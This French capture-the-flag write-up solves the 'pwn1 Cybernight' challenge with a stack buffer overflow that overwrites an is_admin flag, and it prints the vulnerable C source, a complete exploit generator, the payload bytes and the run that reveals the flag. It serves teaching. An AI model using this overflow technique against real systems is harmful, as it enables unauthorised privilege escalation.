# Challenge pwn1 Cybernight writeup

## Description du challenge

Les identifiants de connexion pour la machine du challenge nous sont partagés
```bash
ssh ctf@10.242.0.1 -p 2222
passwd: ***
```
Une fois connecté sur la machine, on liste le contenu du répertoire actuel:
```bash
ctf@10.242.0.1 $ ls
control control.c flag.txt
```
On a pas le droit de lecture sur le flag.txt évidemment
```bash
ctf@10.242.0.1 $ cat ./flag.txt
cat: flag.txt: Permission denied
```
Mais on a le droit de lecture sur *control.c* et le ELF *control*
On copie *control* et *control.c* sur notre machine via *scp*:
```bash
faco@archad $ scp -P 2222 ctf@10.242.0.1:~/control* .
```
*control.c*:
Le programme demande au joueur une direction via *stdin*.
Si la direction est correcte, demande la distance via *stdin* et affiche la nouvelle position.
Si *is_admin* est égal à 1, cat flag.txt avec le uid de root

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define STRING_LEN 250

int main() {
  // Variables de positionnement
  float x_pos = 0.0;
  float y_pos = 0.0;
  int move_x = 0;
  int move_y = 0;

  // Mettre à 1 et recompiler pour lancer en mode admin
  int is_admin = 0;

  // User input
  char action[STRING_LEN];
  char distance[STRING_LEN];

  printf("### ACTION DISPATCHER ###\n");
  fgets(action, 256, stdin);

  if (!strcmp(action, "move right\n")) {
    fgets(distance, STRING_LEN, stdin);
    move_x = atoi(distance);
    x_pos += (float)move_x;
    printf("# MOVED %d TO RIGHT\n", move_x);
  } else if (!strcmp(action, "move left\n")) {
    fgets(distance, STRING_LEN, stdin);
    move_x = atoi(distance);
    x_pos -= (float)move_x;
    printf("# MOVED %d TO LEFT\n", move_x);
  } else if (!strcmp(action, "move up\n")) {
    fgets(distance, STRING_LEN, stdin);
    move_y = atoi(distance);
    y_pos += (float)move_y;
    printf("# MOVED %d UP\n", move_y);
  } else if (!strcmp(action, "move down\n")) {
    fgets(distance, STRING_LEN, stdin);
    move_y = atoi(distance);
    y_pos -= (float)move_y;
    printf("# MOVED %d DOWN\n", move_y);
  } else {
    printf("# UNRECOGNIZED COMMAND\n\n");
  }

  // ADMIN section
  if (is_admin == 1) {
    printf("Bienvenue dans l'espace ADMIN !");
    setreuid(geteuid(), geteuid());
    system("/bin/bash -c 'cat ./flag.txt'");
  }

  return 0;
}
```

control: ELF executable, 32 bit, pas d'execution depuis la stack mais pas de canary ni de randomisation d'adresse.

## Analyse du code source control.c

### Condition de victoire
```c
// ADMIN section
  if (is_admin == 1) {
    printf("Bienvenue dans l'espace ADMIN !");
    setreuid(geteuid(), geteuid());
    system("/bin/bash -c 'cat ./flag.txt'");
  }
```
Si ``is_admin == 1``, le programme va executer ``cat ./flag.txt`` en tant que propriétaire du programme: **root**. 
Le *uid* de *root* possède également le droit de lecture sur le fichier *flag.txt* .
```c
// Mettre à 1 et recompiler pour lancer en mode admin
int is_admin = 0;
```
`is_admin` n'est pas sensé être changé durant le runtime et est donc hardcodé dans le binary.
Cependant ``is_admin`` est déclaré et initialisé dans la fonction `main`, on sait donc que ``is_admin`` sera dans la stack de la fonction `main`.

### L'overflow
Le programme lit deux string de l'utilisateur via ``fgets``  et sont alloués dans la stack.
```c
// User input
  char action[STRING_LEN];
  char distance[STRING_LEN];
```
Le buffer de ces strings sont fixés à 250 char.
```c
#define STRING_LEN 250
```
Le programme lit 256 char dans un buffer de 250 char ici:
```c
  printf("### ACTION DISPATCHER ###\n");
  fgets(action, 256, stdin);
```

On a donc la possibilité d'écraser 6 char en plus dans la stack.
6 char ce n'est pas beaucoup, surtout que d'autres valeurs sont entre la *string action* et *$EBP* (le bas de la pile).
Ce ne sera donc pas assez pour détourner le déroulement du programme en modifiant le valeur de l'adresse de retour de fonction (``[EBP + 4]``).
Par chance ``is_admin`` et ``action[250]`` sont adjacents et un *int* est représenté par 4 bytes.


| STACK         | SIZE in Byte |
----------------|------|
| RET ADDR  |	4
| EBP | 4
| *float* X | 4
| *float* Y | 4
| *int* move_x | 4
| *int* move_y | 4 < writting stop halfway here
| **int is_admin** | 4
| *char[]* action | 250 < writting start here
| *char[]* direction | 250
| ESP | 4

## Exploitation

Il faut maintenant procéder à l'écriture du l'exploit. *fgets* lit *stdin* donc nous allons craft un exploit qui sera pipe vers le programme.
L'exploit consiste en une suite de 'A' (0x41) puis de ``\x01\x00\x00\x00``  *(attention à la notation little endian !)*

Pour commencer je définis les différentes longueur pour bien segmenter le padding du payload *(ici c'est juste \x01\x00)*
```c
#define PADDING_LEN 250 // Le nombre de 'A' à écrire
#define PADDING_CHAR 0x41 // définir le padding à 'A'
#define PAYLOAD "\x01\x00\x00\x00" // écriture little endian de 0x00000001
#define PAYLOAD_LEN 4
#define TOTAL_LEN PADDING_LEN+PAYLOAD_LEN
```

```c
char* buf = (char*)malloc(TOTAL_LEN); // Le buffer qui sera écrit
memset(buf, PADDING_CHAR, PADDING_LEN); // Write 250 'A' at the begining of buf
memcpy(buf+PADDING, PAYLOAD, PAYLOAD_LEN; // Write \x01\x00\x00\x00 at the end
```

| OFFSET  | BUF | in STACK |
|---------|--------- |-|
| 250 | 0x000001 | *int* is_admin
| 0 | AAAAAAAAAAAAAAA [...250] | *char[]* action

Le code complet de *exploit.c*:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PADDING_LEN 250 // Le nombre de 'A' à écrire
#define PADDING_CHAR 0x41 // définir le padding à 'A'
#define PAYLOAD "\x01\x00\x00\x00" // écriture little endian de 0x00000001
#define PAYLOAD_LEN 4
#define TOTAL_LEN PADDING_LEN+PAYLOAD_LEN

#define PATH "evil"

int main(int argc, char *argv[]) {
  char *buf = (char *)malloc(TOTAL_LEN);
  memset(buf, PADDING_CHAR, PADDING_LEN);
  memcpy(buf + PADDING_LEN, PAYLOAD, PAYLOAD_LEN);

  FILE *f = fopen(PATH, "w");
  if (!f) {
    printf("Couldn't write file to %s\n", PATH);
    return -1;
  }
  fwrite(buf, 1, TOTAL_LEN, f);
  printf("Exploit written to %s\n", PATH);
  return 0;
}
```
On compile *exploit.c* puis génère l'exploit à pipe:
```bash
$ gcc ./exploit.c -o genexploit
$ ./genexploit
Exploit written at evil
$ hexdump ./evil
0000000 4141 4141 4141 4141 4141 4141 4141 4141
*
00000f0 4141 4141 4141 4141 4141 0001 0000     
00000fe
```
Il ne reste plus qu'à tester l'exploit:
```bash
$ cat evil | ./control
### ACTION DISPATCHER ###
# UNRECOGNIZED COMMAND

cat: ./flag.txt: No such file or directory
Bienvenue dans l'espace ADMIN !%                                                
```
Le programme a tenté d'ouvrir *flag.txt* ! Il faut maintenant tester l'exploit sur la machine du challenge.

```bash
$ ssh ctf@10.242.0.1 -p 2222 'bash -c ~/control' < evil
### ACTION DISPATCHER ###
# UNRECOGNIZED COMMAND

{FLAG}
Bienvenue dans l'espace ADMIN !% 
```
Victoire !

## Conclusion

Faire dépendre la sécurité d'une partie d'un programme par une variable compilé est un vecteur pour une escalade d'une faille de type buffer overflow, notamment  dans le cas d'une petites zones écrivable au seins de la stack.

Ce challenge n'est pas réaliste, ce type de vulnérabilité doit être spécifiquement autorisé à nos compileur moderne pour être compilé. Cependant l'exercice est une très bonne introduction aux challenges binary exploitation pour les personnes souhaitant commencer. 
